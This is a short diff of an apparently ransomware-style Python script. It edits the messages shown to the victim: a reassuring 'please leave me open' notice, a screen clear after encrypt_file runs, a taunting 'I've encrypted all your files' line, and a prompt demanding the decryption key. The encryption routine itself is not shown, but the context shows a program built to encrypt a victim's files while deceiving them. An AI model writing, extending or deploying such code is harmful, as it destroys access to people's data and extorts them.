@@ -135,7 +135,7 @@ def decrypt_file(private_key):
 
 def await_private_key():
     while True:
-        guess = input("Pretty please enter the decryption key otherwise sorry :( Thing goes here -> ").strip()
+        guess = input("I hope that you are really good at guessing 1000+ random characters in a row :) Type the thing here -> ").strip()
         try:
             if "\\n" in guess:
                 guess_bytes = guess.replace("\\n", "\n").encode()
@@ -168,6 +168,6 @@ if __name__ == "__main__":
     print("Hi hello, currently I am doing something so please give me a minute and leave me open thank you.")
     encrypt_file(public_key)
     os.system("cls")
-    print("Whoops! Looks like I've encrypted your user folder and all your program files :p")
+    print("Whoops! Looks like I've encrypted all your files :p")
     await_private_key()
     input("Ok you can close me now.")
